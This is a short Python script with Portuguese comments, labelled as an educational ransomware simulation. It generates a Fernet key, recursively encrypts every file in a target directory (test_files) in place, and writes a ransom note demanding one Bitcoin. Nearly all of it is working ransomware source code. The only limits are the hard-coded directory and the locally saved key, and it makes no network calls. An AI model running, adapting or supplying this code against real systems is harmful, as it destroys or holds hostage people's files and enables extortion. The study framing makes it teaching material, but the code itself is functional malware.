# Projeto Educacional de Cibersegurança
# Simulação de Ransomware em ambiente controlado
# ⚠️ Uso apenas para fins de estudo. Não utilizar em sistemas de terceiros sem autorização.

from cryptography.fernet import Fernet  # type: ignore[reportMissingImports]
import os

#1. Gerar uma chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file: 
        chave_file.write(chave)

#2. Carregar a chave de salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar arquivos
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

#4. Enconcontrar arquivos em um diretório e criptografá-los
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! Para recuperá-los, envie 1 Bitcoin para o endereço XYZ e entre em contato com o suporte.")

#6. Função principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Todos os arquivos foram criptografados com sucesso!")
if __name__ =="__main__":
    main()    